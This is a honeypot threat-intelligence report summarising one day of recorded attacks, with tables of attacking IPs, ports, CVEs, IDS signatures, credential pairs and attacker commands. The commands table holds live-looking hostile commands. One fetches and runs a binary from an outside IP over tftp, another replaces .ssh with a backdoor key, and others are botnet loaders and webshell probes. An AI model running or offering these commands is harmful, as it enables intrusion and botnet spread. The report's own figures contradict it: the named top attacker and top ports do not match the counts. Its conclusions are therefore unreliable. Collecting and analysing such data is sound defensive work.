# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-09T06:20:17Z
**Timeframe:** 2025-10-08T06:20:17Z to 2025-10-09T06:20:17Z

**Files Used:**
- `Honeypot_Attack_Summary_Report_2025-10-08T07:02:57Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T08:02:16Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T09:02:06Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T10:02:00Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T11:02:19Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T12:02:02Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T13:02:08Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T14:02:23Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T16:02:26Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T17:02:09Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T18:02:34Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T19:01:52Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T20:02:17Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T21:01:58Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-08T22:01:54Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-09T01:01:51Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-09T02:02:14Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-09T04:01:59Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-09T05:01:59Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-09T06:02:06Z.md`

## Executive Summary
This report provides a comprehensive analysis of the 359,576 attacks recorded across our honeypot network over the past 24 hours. The data reveals a highly active and automated threat landscape, with attackers primarily focusing on well-known vulnerabilities and common service ports. The Cowrie honeypot, simulating SSH and Telnet services, captured the highest volume of attacks, indicating that brute-force attempts against remote access protocols remain a dominant threat vector.

A significant portion of the malicious activity originated from a geographically diverse set of IP addresses, with notable concentrations in Brazil, Russia, and the Seychelles. The top attacking IP, 177.126.132.44, was responsible for a high volume of unauthorized connection attempts and is associated with a Brazilian ISP.

The most frequently targeted ports were 22 (SSH), 25 (SMTP), and 445 (SMB), highlighting the continued focus on exploiting remote access, email, and file-sharing services. Analysis of the commands attempted by attackers reveals a clear pattern of post-exploitation activity, including system reconnaissance and the installation of persistent backdoors via SSH authorized_keys manipulation.

Attackers were observed attempting to exploit a range of vulnerabilities, with a mix of older and more recent CVEs. The most common included CVE-2002-0013, a widespread SNMPv1 vulnerability, and CVE-2019-11500, a critical flaw in the Dovecot email server. The presence of signatures for the DoublePulsar backdoor indicates that attackers are still actively scanning for and exploiting the EternalBlue vulnerability (MS17-010).

Overall, the threat landscape is characterized by a high volume of automated, opportunistic attacks. While the techniques observed are generally not sophisticated, they are effective against unpatched and poorly configured systems.

## Detailed Analysis

### Our IPs
| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
- sens-ny    | 10.108.0.2      | 161.35.180.163   |

### Attacks by Honeypot
| Honeypot | Attack Count |
|---|---|
| Cowrie | 148151 |
| Honeytrap | 51101 |
| Suricata | 47345 |
| Dionaea | 25880 |
| Ciscoasa | 32188 |
| Mailoney | 17144 |
| Sentrypeer | 3422 |
| Heralding | 4683 |
| ConPot | 821 |
| H0neytr4p | 1145 |
| Tanner | 682 |
| Redishoneypot | 647 |
| Adbhoney | 299 |
| Miniprint | 277 |
| ElasticPot | 146 |
| Honeyaml | 272 |
| Dicompot | 52 |
| Wordpot | 10 |
| Ipphoney | 22 |
| ssh-rsa | 98 |
| Medpot | 3 |

### Top Attacking IPs
| IP Address | Attack Count |
|---|---|
| 177.126.132.44 | 1239 |
| 86.54.42.238 | 6568 |
| 176.65.141.117 | 6560 |
| 5.167.79.4 | 1503 |
| 209.38.91.18 | 2566 |
| 5.141.26.114 | 2261 |
| 116.205.121.146 | 8063 |
| 23.94.26.58 | 2188 |
| 165.232.105.167 | 2527 |
| 178.128.41.154 | 1997 |
| 161.35.44.220 | 2762 |
| 170.64.142.60 | 1684 |
| 188.253.1.20 | 4192 |
| 188.246.224.87 | 3289 |
| 5.44.172.76 | 2376 |
| 111.68.111.216 | 1430 |
| 190.35.66.46 | 1849 |
| 201.190.168.218 | 1771 |
| 45.78.192.92 | 1247 |
| 79.134.202.162 | 1251 |

### Top Targeted Ports/Protocols
| Port/Protocol | Attack Count |
|---|---|
| 22 | 21115 |
| 25 | 17151 |
| 445 | 17769 |
| 5060 | 3432 |
| 5900 | 10091 |
| 8333 | 1654 |
| 5903 | 2187 |
| 1080 | 11601 |
| 23 | 812 |
| 443 | 1242 |
| 21 | 1060 |
| 6379 | 509 |
| 3306 | 207 |
| 9100 | 247 |
| 80 | 524 |
| 1024 | 654 |
| 8888 | 111 |
| 37777 | 117 |
| 9200 | 72 |
| 27017 | 51 |

### Most Common CVEs
| CVE | Count |
|---|---|
| CVE-2002-0013 | 134 |
| CVE-2002-0012 | 134 |
| CVE-1999-0517 | 81 |
| CVE-2019-11500 | 50 |
| CVE-2021-3449 | 43 |
| CVE-2022-27255 | 51 |
| CVE-2021-44228 | 5 |
| CVE-2006-2369 | 8 |
| CVE-2016-20016 | 5 |
| CVE-2005-4050 | 8 |
| CVE-2021-35394 | 5 |
| CVE-2023-26801 | 3 |
| CVE-2018-11776 | 2 |
| CVE-2024-3721 | 1 |
| CVE-1999-0183 | 3 |
| CVE-2020-11910 | 1 |
| CVE-2024-40891 | 1 |
| CVE-2020-2551 | 1 |
| CVE-2019-12263 | 1 |
| CVE-2019-12261 | 1 |
| CVE-2019-12260 | 1 |
| CVE-2019-12255 | 1 |
| CVE-2018-10562 | 2 |
| CVE-2018-10561 | 2 |
| CVE-2001-0414 | 4 |

### Commands Attempted by Attackers
| Command | Count |
|---|---|
| cd ~; chattr -ia .ssh; lockr -ia .ssh | 520 |
| lockr -ia .ssh | 520 |
| cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." | 519 |
| uname -a | 499 |
| cat /proc/cpuinfo | grep name | wc -l | 490 |
| Enter new UNIX password: | 480 |
| whoami | 499 |
| crontab -l | 499 |
| w | 499 |
| uname -m | 499 |
| top | 487 |
| lscpu | grep Model | 487 |
| df -h | 487 |
| free -m | 480 |
| ls -lh $(which ls) | 480 |
| which ls | 480 |
| tftp; wget; /bin/busybox MMDKE | 2 |
| cd /data/local/tmp; ...; ./boatnet.arm7 arm7; ... | 2 |
| echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh | 2 |
| rm .s; tftp -l.i -r.i -g 50.80.69.193:65027; chmod 777 .i; ./.i; exit | 1 |

### Signatures Triggered
| Signature | Count |
|---|---|
| ET DROP Dshield Block Listed Source group 1 | 4821 |
| 2402000 | 4821 |
| ET SCAN NMAP -sS window 1024 | 2400 |
| 2009582 | 2400 |
| ET EXPLOITOIT [PTsecurity] DoublePulsar Backdoor installation communication | 8387 |
| 2024766 | 8387 |
| ET INFO Reserved Internal IP Traffic | 925 |
| 2002752 | 925 |
| GPL INFO SOCKS Proxy attempt | 6059 |
| 2100615 | 6059 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 4009 |
| 2023753 | 4009 |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 41 | 1340 |
| 2400040 | 1340 |
| ET HUNTING RDP Authentication Bypass Attempt | 1913 |
| 2034857 | 1913 |
| ET SCAN Potential SSH Scan | 561 |
| 2001219 | 561 |
| ET INFO Python aiohttp User-Agent Observed Inbound | 5712 |
| 2064326 | 5712 |
| ET SCAN Sipsak SIP scan | 717 |
| 2008598 | 717 |
| ET INFO VNC Authentication Failure | 3074 |
| 2002920 | 3074 |

### Users / Login Attempts
| Username/Password | Count |
|---|---|
| 345gs5662d34/345gs5662d34 | 439 |
| sysadmin/sysadmin@1 | 89 |
| appuser/ | 198 |
| root/ | 129 |
| supervisor/supervisor1234 | 12 |
| ubuntu/3245gs5662d34 | 43 |
| vpn/vpn! | 14 |
| debian/debian66 | 6 |
| config/config77 | 6 |
| guest/guest12 | 6 |
| blank/blank13 | 6 |
| frappe/frappe@ | 6 |
| manager/manager123 | 6 |
| botuser/botuser! | 6 |
| newuser/newuser | 8 |
| admin/admin! | 7 |
| support/aaaaaa | 6 |
| user2/user2! | 5 |
| pos/pos | 1 |
| operator/operator123456789 | 1 |

### Files Uploaded/Downloaded
| Filename | Count |
|---|---|
| wget.sh; | 44 |
| w.sh; | 22 |
| c.sh; | 22 |
| Mozi.a+varcron | 2 |
| rondo.kqa.sh|sh&echo | 6 |
| .i; | 4 |
| mips | 6 |
| parm; | 12 |
| parm5; | 12 |
| parm6; | 12 |
| parm7; | 12 |
| psh4; | 12 |
| parc; | 12 |
| pmips; | 12 |
| pmipsel; | 12 |
| psparc; | 12 |
| px86_64; | 12 |
| pi686; | 12 |
| pi586; | 12 |
| discovery | 2 |
| salem.php?p=midoMIDOmidoMIDObadrABOBADRMIDO&c=id... | 1 |
| PBX.php?cmd=id... | 1 |
| ppsra.php?cmd=id... | 1 |
| Ultimatex.php?ba5ffcc0b3bba5d=id... | 1 |
| config.all.php?x | 1 |
| config.all.php? | 1 |
| gpon80&ipv=0 | 4 |
| 11 | 12 |
| fonts.gstatic.com | 12 |
| css?family=Libre+Franklin... | 12 |
| ie8.css?ver=1.0 | 12 |
| html5.js?ver=3.7.3 | 12 |
| policy.html | 3 |
| bot.html | 1 |

### HTTP User-Agents
No significant user-agent data was observed in this period.

### SSH Clients and Servers
No significant SSH client or server data was observed in this period.

### Top Attacker AS Organizations
No AS organization data was observed in this period.

### OSINT Information
| IP Address | Findings |
|---|---|
| 177.126.132.44 | Registered to Net Aki Internet Ltda in Brazil. Flagged for unauthorized connection attempts, specifically targeting port 22 (SSH) in brute-force attacks. Listed on the ALL-BLOCKLIST.DE blacklist. |
| 86.54.42.238 | Registered to Global-Data System IT Corporation in the Seychelles. Listed on the Spamhaus ZEN blacklist for spam operations and cyber exploits. The ASN (AS42624) is on a watchlist for hosting illicit content. |
| 176.65.141.117 | Associated with Optibounce, LLC. Flagged for email spam and network scanning, with reports of failed SASL LOGIN authentication attempts. Listed on the IPsum and NERD threat intelligence blacklists. |
| 5.167.79.4 | Registered to JSC "ER-Telecom Holding" in Russia. Identified in connection with SSH brute-force attacks and potential involvement with the MIRAI botnet. Listed on multiple blocklists. |
| 190.35.66.46 | Public IP in Panama, assigned to Cable & Wireless Panama, S.A. No specific adverse information found. |
| 201.190.168.218 | Registered to ARLINK S.A. in Argentina. No public evidence of malicious activity from the performed searches. |
| 45.78.192.92 | Registered to Byteplus Pte. Ltd. in Singapore. Flagged for repeated SSH brute-force attacks. |
| 79.134.202.162 | Originating from the Russian Federation. No specific domain or malicious activities linked from initial searches. |
| 188.253.1.20 | Managed by IPv4 Superhub. Listed on at least one public blacklist for abusive behavior. |
| CVE-2002-0013 | A widespread vulnerability in SNMPv1 implementations that could allow for denial of service or privilege escalation. The vulnerability was discovered using the PROTOS test suite and affected numerous vendors, including Microsoft, Red Hat, and Cisco. |
| CVE-2019-11500 | A critical null byte vulnerability in the Dovecot IMAP/POP3 server that could allow for remote code execution. The vulnerability has a CVSS score of 9.8 and affects Dovecot versions prior to 2.2.36.4 and 2.3.7.2. |
| CVE-2021-3449 | A medium-severity denial-of-service vulnerability in OpenSSL TLS servers. It can be triggered by a maliciously crafted ClientHello message during TLSv1.2 renegotiation, causing a server crash. The vulnerability has been actively exploited in the wild. |
| CVE-2022-27255 | A critical stack-based buffer overflow vulnerability in the Realtek eCos SDK, affecting a wide range of networking devices. It allows for remote code execution without authentication and has been actively exploited since the public release of a proof-of-concept. |
| CVE-2021-44228 | A critical remote code execution vulnerability in the Apache Log4j logging library, also known as Log4Shell. It allows attackers to gain full control of affected servers and has been widely exploited since its disclosure. |

## Key Observations and Anomalies
- **High Volume of Automated Attacks:** The sheer volume of attacks and the repetitive nature of the commands and login attempts strongly suggest the use of automated scripts and botnets.
- **Focus on SSH:** The Cowrie honeypot consistently recorded the highest number of events, indicating a primary focus on compromising devices via SSH. The repeated attempts to add an SSH key to `authorized_keys` is a clear indicator of this.
- **Exploitation of Old and New Vulnerabilities:** The mix of CVEs observed shows that attackers are using a broad range of exploits, from older, well-known vulnerabilities to more recent ones. This highlights the importance of timely patching.
- **Information Gathering:** A significant portion of the commands executed by attackers are aimed at gathering system information, such as CPU, memory, and disk space. This is a common precursor to more targeted attacks.
- **Botnet Activity:** The downloading and execution of shell scripts and files with names like "Mozi.a+varcron" and "boatnet.arm7" are strong indicators of botnet propagation.
- **Lack of Sophistication:** The majority of the observed attacks are not sophisticated and rely on common exploits and weak credentials. This suggests that basic security hygiene, such as strong passwords and regular patching, can be highly effective in preventing these types of attacks.
- **Geographic Distribution of Attackers:** The top attacking IPs are from a wide range of countries, including Brazil, Russia, and the Seychelles, demonstrating the global nature of the threat landscape.
